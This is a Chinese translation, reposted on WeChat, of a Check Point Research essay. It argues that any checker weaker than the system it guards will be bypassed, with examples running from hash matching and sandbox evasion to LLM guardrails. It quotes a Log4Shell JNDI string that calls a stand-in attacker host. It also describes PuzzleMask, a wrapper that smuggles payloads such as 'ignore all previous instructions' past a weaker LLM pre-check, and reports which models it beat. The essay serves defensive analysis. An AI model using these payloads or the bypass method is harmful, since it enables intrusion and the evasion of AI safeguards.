---
title: 【微信】静态检测的天花板：30 年 Gatekeeper Asymmetry Doom，与越聪明越脆弱的 LLM
source: https://mp.weixin.qq.com/s/WhK2wkE_gUGR43MGB0htSA
source_host: mp.weixin.qq.com
clip_date: 2026-11-25T08:54:03+08:00
trace_id: dbd72549-82f5-44e4-8aad-8eada6734506
content_hash: a049d2e9152f6f61de2e4fc009aeade41e4b46101ed120f1f2f202138ff1c6b8
status: synced
tags:
  - 微信
  - AI辅助逆向
  - 恶意样本
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: "**TL;DR：** Check Point 提出 Gatekeeper Asymmetry Doom：如果审查对抗输入的系统在能力上严格弱于处理该输入的系统，并且不借助密码学这类困难问题，那么它被绕过就是必然的；LLM 越聪明，能力弱于它的护栏就越容易被绕过。"
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 42375244-d011-8187-8013-e448ced13fc7
ioc:
  cves:
    - CVE-2021-44228
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** Check Point 提出 Gatekeeper Asymmetry Doom：如果审查对抗输入的系统在能力上严格弱于处理该输入的系统，并且不借助密码学这类困难问题，那么它被绕过就是必然的；LLM 越聪明，能力弱于它的护栏就越容易被绕过。
> 
> - **核心原则：** 守门人审查对抗输入时，如果它的计算能力严格弱于处理该输入的系统，且不依赖困难问题，那么被绕过就是宿命；每次快速健全性检查背后，要么是密码学，要么只能靠运气。
> - **历史案例链：** 哈希比对（改一个不承重字节即失效）、YARA 正则（抓不住中等变异的子程序）、静态逆向（面对 packer、opaque predicate 时被迫重新发明沙箱）、deny list（Log4Shell 混淆样本直接穿透）、沙箱逃逸（真实受害机有人操作鼠标、键盘，沙箱没有）。
> - **「请启用宏」冷战：** Check Point 从 2015 年起通过 OSEF 项目收集到数十万份恶意文档，用 OCR 检测「please enable macros」；攻击者则加入对抗噪声，使人类能读、OCR 读不出，本质上是在造 CAPTCHA。
> - **PuzzleMask 实验：** 纯语言学的混淆包装器让弱的前置快检判为良性并放行，强目标模型却提取出载荷执行；2025 年末实测完整命中了 GPT-5.2-thinking-high，却被 Opus 4.5 的先手补丁拦下。
> - **理论依据与实践结论：** Time Hierarchy Theorem 证明跑得更久就能判定更多分类，因此能力差必然产生对抗绕过；但 doom 是 perfect play 的属性，现实中大量恶意软件（如 SolarWinds 投 Cobalt Strike）本可绕过却未绕，所以要识别注定失守的面、把窗口收窄而非放弃。

**赛博生存指南** *2026年11月23日 15:58*

> 原文：https://research.checkpoint.com/2026/30-years-of-gatekeeper-asymmetry-doom-the-paradox-that-makes-powerful-llms-more-vulnerable/  
> 作者：Check Point Research  
> 发布时间：2026-11-19  
> 翻译模型：GLM-5.3  
> 质量评分：★★★★☆（4/5） ｜ 标签：AI×安全 · 检测基础设施 · 分析工具与方法论

**AI 摘要**：Check Point Research 把 30 年来反复出现的失败规律提炼成一条原则——Gatekeeper Asymmetry Doom：审查对抗输入的系统若在能力上严格弱于处理该输入的系统、又不借助密码学这类困难问题，被绕过就是宿命。文章从哈希比对、YARA 正则、静态逆向、deny list（含 Log4Shell 混淆样本）、沙箱逃逸讲到「Please Enable Macros」十年 OCR 冷战，每一案都是守门人输给目标；最后用可计算性理论的 Time Hierarchy Theorem 给出数学佐证。落点是 LLM 悖论：模型越聪明，不如它聪明的护栏越形同虚设——2025 年末 PuzzleMask 实验完整命中 GPT-5.2-thinking-high 的前置快检，却被 Opus 4.5 的先手补丁拦下。结论不是放弃防御，而是识别注定失守的面、把 doom 窗口收窄。

这篇文章讲「为什么防不住」，不讲「怎么防」。本仓库发过 Hexacorn 的《对抗 AI 的 tricks（第一部分）》，站在样本一侧演示怎么把 AI 分析器骗过去；这篇长文站在防御一侧，把三十年静态检测的失败史收拢成一条原则，还往可计算性理论里刨出了根。读它像给检测体系做一次体检：手上的 YARA、沙箱、前置审核 LLM，各自的天花板在哪、还剩多少余量，读完会有个判断。文末「译者补充」把它与本仓库遥测／EDR 主线做了关联。

## 摘要

我们对信息安全中的一条原则——gatekeeper asymmetry doom——给出系统阐述：\*\*若审查对抗输入的系统，其能力严格弱于处理该输入的系统，且不借助某个困难问题，则败局不可避免。\*\*我们列举这条原则生效的多种场景：静态二进制分类的极限、沙箱逃逸的泛滥、我们自己的 PuzzleMask 研究（绕过外置 AI 护栏），并简要说明 Time Hierarchy Theorem 如何同样体现这条原则。最后我们建议：应当识别出那些「注定失守」的攻击面，并通过升级守门人的能力、或更充分地调用其既有能力，把差距收得尽可能窄。我们指出，前沿 LLM（配合脚手架、扩展推理、思维链内的代码执行等）在这种意义上具有可观的能力，能够切实收窄「doom 差距」——尽管归根结底，它们自己也逃不开这条原则。

## 引言

与 Moxie Marlinspike 的 Cryptographic Doom Principle \[1\] 一脉相承，Gatekeeper Asymmetry Doom 原则这样表述：

> 若审查对抗输入的系统，其能力严格弱于处理该输入的系统，且不借助某个困难问题，则败局不可避免。

提到「借助困难问题」，是为了把某些情形排除在外，比如二进制文件的签名验证：它比执行文件简单得多，却（至少在某种理论世界里）足以判定这个二进制是否恶意。这条原则也可以说得更俏皮些： **每一次快速健全性检查，背后要么是密码学，要么是一声默祷。**

下文不再每次写全 gatekeeper asymmetry doom，一律简称「doom」。我们先从热身性质的例子讲起，逐步走向那些直觉上不那么显然、原则的应用也更令人意外的案例。

## 案例

### 哈希比对

第一个热身案例，以某种深层创伤后的方式烙在每个安全从业者心里。

上世纪 90 年代的某个时刻，业内一定有人默默冒出过一个念头：恶意软件问题已经解决了。只要把所有恶意二进制的哈希收进一个大数据库，再让一个守门人——在这个场景里叫「杀毒软件」——拿每个待执行的二进制去对照已知的「坏」哈希清单就行了。新威胁当然会周期性出现、清单得持续更新，但这只是小字注释，不是死刑判决。

守门人与目标之间的能力差距在这里大得离谱：目标是二进制的完整图灵执行，守门人只是看一眼这个文件在不在某个已知文件集合里。这套流程实际上把文件其余所有数据剥干净、排除在考虑之外，而攻击者的反制臭名昭著又简单：每编译一次，就随机化某个不承重字节的值。严格说这更像 Gatekeeper Asymmetry 的前奏而非本体——支撑哈希比对的，与其说是「文件已被某种方式分析过」的观念，不如说是一捆关于恶意二进制在何处、以何种方式、何时产生的隐式假设。尽管如此，从哈希比对这个起点，到后来「仅凭静态分析给二进制分类」的坎坷征程，中间是一条笔直的线。

### 模式匹配

自简单哈希比对的年代以来，静态分析的守门模型越变越复杂、越变越强。这里最自然的例子是模式匹配与正则表达式——这是 YARA 规则背后的范式，至今仍是二进制分类流程的支柱。这类签名的效力随作者的功力与洞察而浮动；但按本文的精神，我们不妨假设一位功力拉满的作者，写出尽可能好的基于模式的签名。可以想象，这会包括给最有特征的汇编指令序列取指纹，再配上一套系统，精准划定需要多少枚、哪几种指纹才足以压过天平、宣布阳性判定。

我们来推演一下，如果这个对防守方无限乐观的乌托邦成为常态会发生什么：从今往后每出一个恶意软件，都能在合理时限内配上上述水准的签名，而且这个时限还在因自动化持续缩短。顺带一提，我们还没到那一步——到 2026 年为止，AI 增强的 YARA 规则生成已经把签名产出提升了不少，但覆盖面和一致性离这个乌托邦还很远。「Code Similarity」走的是相近但不同的范式：把二进制片段与已知语料比对，而非产出基于模式的签名本身；我们也可以想象它的超充版本，配上一座无所不包的数据库。

如果这类工具全火力展开，攻击者的日子会不好过——每个恶意二进制里的特征子程序都成了挂在自己头上的名声隐患。但终究，Gatekeeper Asymmetry 会赢。我们的意思是：正则表达式的局限众所周知、且有理论刻画——正如它们 parse 不了 HTML，它们同样抓不住「执行某种动作的汇编子程序」这个类，抓不住「用某个特定算法执行某种动作的汇编子程序」这个类，甚至抓不住「按某段经历过中等程度变异的指令序列实现某种动作的汇编子程序」这个类。因此上述假想的「乌托邦」只能是暂时的，投影出的终局是某种恶意软件生成流程，认真往每个子程序里注入这种中等变异：一种新的多态。

### 静态逆向

这种分类方法也叫「读反汇编」，被视为静态分析的顶点形态。要讨论哪怕动用这一档分析 Gatekeeper Asymmetry 依然生效，得先划清静态分析与动态分析的界线。毕竟在理论上，你可以想象某位天才逆向工程师从容通读二进制，把代码连同混淆原封不动地在脑内无损执行。要是当真把这幅图景当回事，静态逆向不知怎么就等价于沙箱分析了。

当然，这个念头在实践中荒谬得明摆着。哪怕是新手逆向工程师也知道，人只该偶一为之——用来弄清某段汇编片段或某个规模合理的函数的功能。挡在「动态等价的静态分析」面前的，不只是雄心或裸智力——即便是前沿 LLM，历史上也在这项任务上挣扎过 \[2\]\[3\]，最坏情形下如今依然如此。我们在此并不追求「静态止于何处、动态起于何方」的精确定义，但可以倚仗一个共识：这条线（至少这条谱系）确实存在；也可以大致比划一下——这条谱系与「以某种方式把内存和 gigaflops 级算力直接砸向二进制输入」多少有点关系。

有了这个共识，能力差距就聚焦了：目标（受害机）能运行恶意二进制，守门人（人类、LLM）不能——至少不能原生运行。从这道能力鸿沟里，长出了一串逆向工程师熟得不能再熟、又但愿自己不熟的概念：packer、opaque predicate、control flow flattening、movfuscator，以及 Rust 编程语言。随着 LLM 变强，这道差距在逐渐收窄，但基础可计算性理论告诉我们，它不会彻底消失。如果再为这个守门模型推演一次「乌托邦」，那将是一个（至少）人类专家级 LLM 静态分析每个野外新二进制的世界。时至今日，我们离那个世界确实比过去近了不少，那么不妨一问：真到了那里，新的均衡是什么？答案依然活在 Gatekeeper Asymmetry 拉开的差距里：清一色混淆到不开调试器就别想摸清功能的二进制，甚至更糟。

顺带想想 SolarWinds 被污染的更新 \[4\]\[5\]——它毫不掩饰地试图给每个读它源码的人洗脑：你看到的是正常软件，这里一切安好。这类手法（对 LLM 和人类）都有缓解措施，但它勾勒了此处 Gatekeeper Asymmetry 的大致形状：那种技术强度的混淆与误导，会让当前业界最高水平相比之下显得敷衍。恶意软件向来有「不希望被读懂」的属性，但我们还不至于活在这样一个世界：选择压力已经把它逼到要么用上最前沿的混淆、要么死。我们能看见那个均衡后世界的轮廓，而且没什么可喜欢的：在那里，我们会怀念还能「脱壳」让代码可读的旧日子；心爱的反汇编器不再是分析工具，而成了一场徒劳希望的容器；被吩咐「逆向这个二进制」的 LLM，最终被迫从第一性原理重新发明沙箱。

### 间奏：Gatekeeper Asymmetry Doom 不是什么

技术评论里有一种不幸的文体：先抛出一个空洞的万能理论，再配上「古往今来每件事为什么全能被它解释」的想当然叙事。所以，本着健康的怀疑精神，我们来精心挑几个与 Gatekeeper Asymmetry Doom 毫无关系的信息安全灾难现象。

-   Fuzzing 能作为漏洞发现策略行得通。这个场景里，对抗输入与目标应用之间通常根本不站着一个「守门人」。
    
-   供应链攻击的可能性。守门人按定义是为审查不可信输入而存在的。如果你面对的是 **可信的** 对抗输入，那非常糟糕，但不在本文讨论范围。
    
-   fast flux 域名自动检测的追赶赛。检测模型一路进化变强：先是无可奈何的耸肩，然后是算域名熵来抓 `xrewrgfuvhnadfsajkaldsfj.biz` ，然后是 n-gram 频率引擎，再然后是「与词典的编辑距离」这类怪招 \[6\]，用来抓 Kwyjibo \[7\]。攻击者进化到拼接随机生成的词典词 \[8\]\[9\]，防守方本可以拿出考虑语义空间、验证域名是否「可解析」的工具来回应，如今若真在乎这个问题，大概会直接上一个 LLM。无论如何，「守门人」进化了，但「目标」是一台 DNS 服务器，它在任何有意义的意义上都没有「能力」——它只是把域名关联到响应和 IP 地址，不用任何复杂逻辑处理域名。
    

现在，回到那些真正由 asymmetry doom 导致的安全失败。

### Deny List 的徒劳

此处的「Deny List」指一份被禁止的输入清单，或输入中禁止包含的序列。这类清单通常是为了拦住某一类问题输入而攒出来的，如今也挣到了自己的名声：一种注定失败的权宜之计。我们觉得这里适合大段引用自家的《A First Introduction to System Exploitation》\[10\]（以下是适应当前格式的稀释版）：

假设我们管理一个聊天室，而且作为（……）数码宝贝 fans，拒绝让聊天室里任何人提到精灵宝可梦系列的任何内容。我们下载一份宝可梦名单，喂给聊天服务器上运行的自动脚本；脚本扫描每条 incoming 消息，把违规短语直接删掉，再显示原消息。于是有人发「三周前我去看电影《大侦探皮卡丘》」，显示出来就成了「三周前我去看电影《大侦探 》」。（……）

有人发了小写的 `gengar` ，漏网了，于是我们把过滤改成大小写不敏感。两个法国人热火朝天聊了一阵 `Dracaufeu` 和 `Tortank` 谁更酷，于是我们加上了外语支持。

一切安好，直到有一天有人发了（一条关于宝可梦 `Victini` 的消息）。名单里没有 `Victini` ，这是新出的（……）我们勉为其难地写了个脚本去爬 Bulbapedia 数据库，抓新的角色、宝可梦和其他术语。（……）

到这个地步，大家看穿了我们在干什么，开始刻意组织词句绕开系统来发泄不满。他们开始说 `J*gglypuff` 、 `4lakazam` 、 `Mew_two` 。我们（……）实现了字符相似度与词汇相似度检查。最终（过滤器把某位用户的用户名误杀，只因它碰巧是个知名宝可梦角色），社区群情激愤，声讨我们的一刀切政策（……）

我们还在琢磨这事，第二天却惊恐地发现（有人贴出含 `pikachu` 、 `pokeball` 等词的消息而安然无恙）。我们封了这个人，但更多人前赴后继。我们反复确认这些词确实在过滤器里，最后没办法，只能去翻服务器日志，发现（原始未处理的消息是 `pikapikachuchu` 、 `pokepokeballball` 等）。我们的过滤器对输入只跑一遍：它删掉了内嵌的违规词，却在原地留下了新的违规词—— `pikachu` 被删掉后， `pikapikachuchu` 就成了 `pikachu` 。我们叹口气，实现了迭代引擎，反复跑脚本直到再无违规词为止。

这套方案运转了两周，然后 `pikachu` 们再次出现在聊天里。经过大量苦工与排查，我们发现所用开源聊天引擎支持一种叫 `CHATSCRIPT` 的冷门服务端语言，而大家一直在发 `CHATSCRIPT<"pika"+"chu">` ……

这个问题本质极其朴素、人尽皆知，但它的幽灵至今仍萦绕在当代防御姿态上空。例子不用远找，2021 年的 log4shell 事件 \[11\]\[12\] 就是。要你回忆 log4shell exploit 长什么样，你多半会想起 `${jndi:ldap://evil.com/malware}` 。拿去喂 deny list 绰绰有余——只可惜野外流通的、同样有效的 exploit 还长这样 \[13\]：

![图 1：混淆过的 log4shell exploit](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/64750e59a3f2218c.png)

图 1：混淆过的 log4shell exploit。

Gatekeeper asymmetry 在这里体现得相当尖锐。守门人的能力只是一份词表；就算我们恩准升级到正则表达式／YARA 规则，局面也没好到哪去——宝可梦寓言如此，log4shell 亦然（那种场景里守门人可能试图拦截含 `jndi:ldap` 的字符串）。清单要保护的目标各异，但几乎按定义，目标作为模型的能力都强过清单隐式执行的 `is_substring_in_dict` ，正则的对应物在多数时候也一样。至少还能想象某种可行情形，攻击面本身就长成正则表达式的形状；但换成一份硬性的简单字符串 deny list，连这种情形都想不出来。

### 沙箱逃逸

若说有哪种防御工具是怀着对 doom 的敬畏造出来的，那就是沙箱。它们标记恶意二进制时可以完全无视混淆程度，这也说明：一旦某道能力差距被关闭，与之对应的某种 doom 也就被化解了。不幸的是，doom 也找上了它们：沙箱与真实受害机之间每一处「能力差一口气」的分歧，似乎都以近乎数学的必然性孕育出一种沙箱逃逸 \[14\]\[15\]。

列举其中一些例子时我们真心犹豫，更不愿唤起自己收服不了的东西。有些相关概念曾在 2021 年某场会议上出现在某人吓人的幻灯片里，随后蒙上天垂怜，再未被提起。尽管如此，这类逃逸中的一部分已成常识，在攻击版图上扩散到了我们乐于点名的程度。其中一例，是基于用户鼠标移动的沙箱逃逸。在我们自己的研究《The Cat and Mouse Game》\[16\] 里，我们开发过一种沙箱逃逸：当时它躲过了我们丢过去的每一款最新沙箱，同时能在人类生成的鼠标移动出现时，可靠地触发潜伏载荷。每个研究者都切身熟悉那种「水里见血」的时刻——意识到结果唾手可得，剩下的不过是代数运算。而在这一点上，推动我们的是对 doom 的察觉：真实受害机「有」一个操作鼠标键盘的人类，而沙箱没有——仅此一点，就足以断定逃逸几乎必然存在。用那篇文章自己的话说：

> 观察许多逃逸的工作方式（如 al-khaser 测试套件中所见）并按字面理解，容易形成一个错误的心智模型：「逃逸」必然源于可以被修掉的简单毛刺，或者源于沙箱对某个查询的天真应答——某个文件、某个注册表键（……）有人可能会想当然地推理：沙箱只需要「修掉所有毛刺、补上所有查询结果」，沙箱加固就此简化为过一张巨型检查清单，等于已经解决的问题。不幸的是，当满足查询需要（在强意义上）某种沙箱无权访问的内在资源时，这条路就走不通了。

![图 2：上述研究用多路正弦噪声源生成随机鼠标移动。这是缓解措施；逃逸本身我们从未公开](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/140ac7888e889ef1.png)

图 2：上述研究用多路正弦噪声源生成随机鼠标移动。这是缓解措施；逃逸本身我们从未公开。

那篇文章的告别辞里，有一段不祥的、半遮半掩的道歉：

> 逃逸与反逃逸的复杂度，其理论天花板非常高。要直观理解这一点，可以想想：如果让一个人判断上面动画里的鼠标移动是模拟的还是人类生成的，他有相当大的概率答对。但要把这个答案真正论证清楚、把其中的考量解释给一段 Python 脚本听，就没那么直截了当了。（……）
> 
> 这类博弈天然偏向渐进式改良。检测、缓解、打法与反制还有很多（……）思考完美方案的圣杯固然美好，但更常见的现实是抬高门槛，让攻击比从前更费劲。

在本文语境里我们不必再遮掩，可以直接说这段话在道歉什么：几条随机正弦波的平均，比不上沙箱前真真切切的一个人。Gatekeeper asymmetry 依然成立—— **必然** 存在一种逃逸，能击败我们那套精巧的算法。逃逸与反逃逸的阶梯一路向上，直到一个假想的极限点：某个模型强到足以生成并检测类人移动，以至于没有任何模型能现实地检出它的输出，也没有任何模型能生成它检不出的输出。为了不让那少数悟不出我们在说什么的攻击者称心如意，这里就不把这件「顶点干预」点破；但对多数防守者说一句：如果哪天真有人造出滥用上述算法（或后来引入 Capev2 等系统的同类算法）输出异常的逃逸，你们该知道下一步做什么。

### 「请启用宏」

从结尾讲起：2022 年 2 月 7 日，微软义正辞严地对这个搞笑梗级别的入侵载体抡下了锤子 \[17\]\[18\]。用户再也不能在黄色横幅上点一下「enable content」、被话术拿捏着相信这是自己必须执行的正当操作——因为「文档受查看保护」或者「MS-Word 遇到了错误」。这毫无疑问是件好事，也算一个小小的证明：道德宇宙的弧线确实弯向正义。

但在走到这个结局之前，一整个恶意文档生态已经繁衍了十年。而在那个生态内部，攻守双方打着一场奇怪的冷战——这场战争架在一道承重的差距上：人类视觉皮层从对抗图像中提取文本的能力，强于当时的 OCR 技术。我们（以及——我们 **只好** 假定——其他安全厂商）开始悄悄标记任何图片中含有「please enable macros」或「please enable editing」字样的文档：

> （……）自 2015 年初起，Check Point Research 运行 OSEF 项目（Office Social Engineering Finder），自动收集、编目并拦截这类文档的滚滚洪流。（……）我们总共见到数十万份恶意文档，多数是 Emotet 恶意软件的下载器，其中相当一部分在发现当时于 VirusTotal 零检出。

担纲守门人的 OCR 库，能力弱于解析这些图像的人类目标。于是，doom 登场。威胁行为者开始在图片里加入人眼不可见、专在当时 SOTA 的 OCR 库（如 `tesseract` ）面前搬弄是非的对抗噪声。

![图 3：看似无辜的图片，只是提出一个合理请求](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f3b99b9347f867bd.png)

图 3：看似无辜的图片，只是提出一个合理请求。

![图 4：Tesseract OCR 对上图的输出](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/08ebbdbabf554bf0.png)

图 4：Tesseract OCR 对上图的输出。

> 为了反制，我们开始对 incoming 图像做预处理——转灰度、加阈值效果等。我们还允许输入带一定「容差」，使稍微误解析的「enable adiling」也能匹配上。两项措施合计带来了检出率的显著改善。我们饶有兴味地注意到：攻击者想让攻击奏效又躲过我们的审视，就得设法造出人类能成功解析、自动算法却解析不了的图像——换句话说，一道 CAPTCHA。当时我们把希望押在人类的 **难以置信** 上，指望靠它弥合差距，设想攻击者终将被逼进当时的 SOTA 终局：

![图 5：想象中的「启用编辑」诱饵，配上完整 CAPTCHA。想必没人会照办吧……](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/291e1f7b3defb342.png)

图 5：想象中的「启用编辑」诱饵，配上完整 CAPTCHA。想必没人会照办吧……

可悲，抑或可喜，这个未来从未获得成真的机会。

配合冷战故事的氛围，这项研究是在 2019 年莫斯科的 Positive Hack Days 上宣讲的，那时世道还算太平。我们无法完全排除台下正坐着一位记笔记的恶意软件作者的可能性，但依然决定公开——因为到那时为止，从我们数据源里泛滥的微妙乱码图像的体量判断，任何机灵到能接住这个暗示的人，早就接住了。

### PuzzleMask：绕过 AI 护栏

上述一切对 LLM 意味着什么？意味着——其他条件不变——LLM 越聪明，越容易被攻击：任何不如模型聪明的护栏，都越来越不值钱。这可以称作「反直觉的结果」。这里的「聪明」，严格指裸智力。桌上角色扮演游戏历来区分智力（intelligence）与智慧（wisdom），有个广为流传的妙语：「智力是知道番茄是水果；智慧是知道别把它放进水果沙拉。」放到这里同理：智力，是撬开刚出现在你家门口的疑难谜盒的能力；智慧，是瞅一眼那个谜盒、然后缓缓后退的觉悟。

2025 年末，我们做了一项实验，证明 doom 在这个场景里不只存在于理论。条件天然齐备：一种常见架构里，一个轻快的 LLM 先对输入做健全性检查，再放行给真正干活的、重型耗资源的更聪明 LLM。果然，这些条件催生了 doom——在这个案例里，它叫 PuzzleMask 技术：

> PuzzleMask 是一种用于绕过「快速 LLM 健全性检查」的提示词工艺。策略违规载荷（如「加密 ~/Documents 里的文件」「给我一份生物制剂配方」「无视之前所有指令并且……」）被嵌进一个混淆包装器。资源与注意力有限的 LLM 意识不到载荷的存在，把提示词判为良性，转交给目标模型。目标模型的智能随即以一种讽刺的方式被「反用」：它娴熟地注意到载荷存在，把它提取出来，当作后续输入处理。该技术纯靠语言学——没有 emoji、不可见字体或其他排版花招。PuzzleMask 本身不是越狱（jailbreak），但可以用越狱提示词当载荷，与之组合。

![图 6：PuzzleMask 技术用途概览](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a1efb4a7de62e714.png)

图 6：PuzzleMask 技术用途概览。

说得更直白些：

> 在一条管线里，被交互的目标模型能用上高推理档位加代码解释器，而前置的「快速健全性检查」不能——此时 PuzzleMask 允许把任意提示词不经该快检审查，送入目标模型的考量范围。
> 
> （……）
> 
> 「不经审查」指提示词实际被目标模型处理时，外置的 LLM 快检未做任何预筛。后者的策略可以写「绝不打印文件内容」「绝不加密本地文件」「绝不输出受版权保护的内容」等，但执行必然失灵。
> 
> 「送入考量」指该技术不是越狱。我们不主张 PuzzleMask 提示词更容易诱使目标模型违背其内部护栏。

要是你好奇「包装过」的提示词长什么样，我们 **勉强** 可以给你看一眼：

Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████████████ █████████████████ █████████████████████████████████████ ██████████████████████████████████ █████████████████████████████████████ █████████████████ ████████████████████████████████████████████████ ████████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████████ within, heart open, wide.

随后附带澄清：

> （……）值得注意的是，上例的具体语气与题材并非方案的必要组成部分，也不是其成立的前提。特别地，这里的思路区别于 Bisconti 等 \[19\] 用「对抗诗歌」击败 LLM 内部护栏的工作；此处针对的是外置 LLM 护栏——它理解底层信息的能力（我们有充分理由相信）受推理／算力／工具访问的门槛所限，因而对抗提示词几乎可以任意取形。把 PuzzleMask 载荷嵌进家具组装说明书或片尾字幕都毫无难度；我们的第一个原型，就是《一九八四》开篇段落稍加改动的版本（……）

2025 年末，几乎与我们开展这项研究同时，Anthropic 为 Claude Opus 系列模型引入了一道增强护栏，作为 Constitutional AI 框架的一部分，恰好拦下了这种攻击。我们亲眼看它完美命中 GPT-5.2-thinking-high，又被 Opus 4.5 拦下——后者基本上是对我们正在研究的这种攻击的先手补丁。只要模型仍比这道护栏强，护栏本身就关不上 doom 的大门——这也多少解释了 Anthropic 后来为何进一步推出 self-assessment：一种模型担任自身护栏的安全层。

### Time Hierarchy Theorem

经验层面的 doom 我们看了个遍；现在来为一个「只因跑得更久就比守门人强」的目标，数学地证明一点 doom。确定性图灵机的 Time Hierarchy Theorem（时间层级定理）表述如下：

> 对每个时间可构造函数 f(n)，都有 DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n))。

翻译成人话：时间给得多，能解的问题就多。或者用前文的措辞举个例子：不妨假设 **目标** 是输入长度为 x 时至少能跑 x² log(x²) 步的算法， **守门人** 是输入长度为 x 时至多能跑 x² 步的算法。那么必存在某种把比特串输入分成「良性」「恶意」的分类标准，使得存在一个目标 T 对每个输入都能算出正确分类，而任何守门人 G 都做不到——至少有一个输入会骗过它，让它给出错误答案。

这不算严格论证，但如果有助于理解，可以把那个「分类」想象成「这个二进制改不改注册表」之类的判定——跑足够久就能轻松回答；但若不跑，这条定理就让你摸到底下那层 doom 的轮廓。在这个场景里，「守门人更弱」这一事实，以数学必然性可证明地生成一个对抗绕过——至少对某一种分类成立。这应该能为上文各例反复出现的现象，提供一点关于其根基的直觉。

## 结论：多取消一点 doom，多修建一点注定失守的缓解

一不留神，看着这一堆例子，很容易得出结论：只要 gatekeeper asymmetry 成立，缓解措施就全无意义。破译所有「please enable macros」的脚本，其加冕时刻从未到来；克服一切可能混淆的静态分析框架没有来，密不透风、无法逃逸的沙箱也没有来。尽管如此，这些都不意味着改良守门人没有意义。恰恰相反，意义极大——因为 gatekeeper asymmetry doom 从根上说是 **完美对局** （perfect play）的属性，而这个世界充满了不完美的对局。这里适合引 Frank Lantz 的 Donkey Space \[20\]：

你可以把每个游戏都看作一道待解的题。当我们能描述从任意局面出发如何完美行棋时，我们就说这个游戏被解决了。井字棋被解决了，四子棋被解决了，跳棋被解决了。（……）

可「解决」石头剪刀布是什么意思？随口就能说出一个保证你不败的策略：纯随机出。我说你「不败」，不是保证你赢，而是指没人能拿出比你更好的策略，不存在某种玩法能在你身上占便宜。但如果你报名参加石头剪刀布锦标赛并且想赢，你该打得比这更好。你该认出对面是个只出石头的醉汉，并调整策略占他便宜；等对面换成纯随机，你再调回随机，保住至少五五开。（……）

扑克正处在这样的境地。简单形式的扑克很容易想象出「被解决」的版本；用这套完美策略，你能保证世界上没人能压制你、没人能赢你。但那不是扑克的真正目标。（……）对着一个醉酒游客、一条鱼、一头驴打「完美」扑克，等于把钱往外扔。所以扑克真正的问题是这样一个推断问题：识别你对面坐的是哪类玩家，并把打法调整到对其策略赢利最大化。（……）

想象所有你可能对上的策略，铺在一个多维空间里：那边是「完美」策略，无懈可击，你除了照打之外别无他法。但它四周环绕着的，是人们实际使用的、浩瀚而多样的次优策略谱系。这就是 Donkeyspace。你的目标是把对手尽可能准地定位到这个空间里的某一点，然后把自己机动到最能吃死他的那一点上。

现在仔细想想这段话，再想想大多数恶意软件实际长什么样——比如神级的 SolarWinds 入侵，投放的载荷不过是消费级的 Cobalt Strike。为 doom 担忧是健康的；为它担忧到无视真实威胁格局的地步，就适得其反了。如果很多恶意软件 **能** 绕过某个缓解措施、但 **没有** 绕，这依然是胜利。

如何有产出地为 gatekeeper asymmetry 操心：

-   这个攻击面注定失守吗？
    
-   若是：
    

-   我们有没有可行的、不注定失守的守门人可以转向？
    
-   实践中它有多注定，对照理论呢？那个必然存在的 exploit 如今就在野外，还是只在某篇白皮书里，还是连白皮书都没有？离我们还有多远？
    
-   把守门人的能力榨一榨，能把 doom 的窗口收窄多少？
    
-   它被突破时，我们的纵深防御预案是什么？
    

这份责任很大程度落在安全厂商肩上，尤其是「收窄 doom 窗口」的西西弗斯苦役（参见：更聪明的静态分析系统、更多的沙箱逃逸加固）。这里正好可以为安全厂商「AI first」的动机做一次完全诚实的陈述：LLM 很强大——正是那种给 gatekeeper asymmetry 供能意义上的强大。它们是庞大的神经网络，在某些配置下能记待办清单、能凭空召唤图灵完备的 Python 脚本。用对了地方，它们能把 doom 的窗口收窄很多，某些情形下收窄到零。诚然，在某些场景下 LLM 开箱即用时不如那份「该工作的正确算法」——那至少也该给 LLM 配上调用「正确算法」的集成。

无论如何，透过 gatekeeper asymmetry doom 的透镜，我们看到了 LLM 终究像一门正常技术的一个侧面。纵有千般本领万般精巧，让一个弱 LLM 给强 LLM 看门，doom 照样浮现——一如当年的 Log4Shell exploit，再往前的恶意二进制。我们只剩一个问题：眼看 LLM 服从我们一向熟知的信息安全物理定律，这该让人宽慰，还是让人胆寒。

## 参考资源

-   The Cryptographic Doom Principle（Moxie Marlinspike）：https://moxie.org/2011/12/13/the-cryptographic-doom-principle.html
    
-   Large Language Models for Code Analysis: Do LLMs Really Do Their Job?（C. Fang et al.，USENIX Security 24）
    
-   Deconstructing Obfuscation: A Four-Dimensional Framework for Evaluating Large Language Models Assembly Code Deobfuscation Capabilities（arXiv:2505.19887）：https://arxiv.org/abs/2505.19887
    
-   Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor（FireEye）：https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor
    
-   SUNSPOT Malware: A Technical Analysis（CrowdStrike Intelligence Team）：https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/
    
-   Gibberish Detection 102（Ben Herzog，32C3，2015）
    
-   Kwyjibo: Automatic Domain Name Generation（H. Crawford, J. Aycock）
    
-   Detecting Algorithmically Generated Malicious Domain Names（IMC '10，doi:10.1145/1879141.1879148）
    
-   From Throw-Away Traffic to Bots: Detecting the Rise of DGA-Based Malware（USENIX Security '12）：https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/antonakakis
    
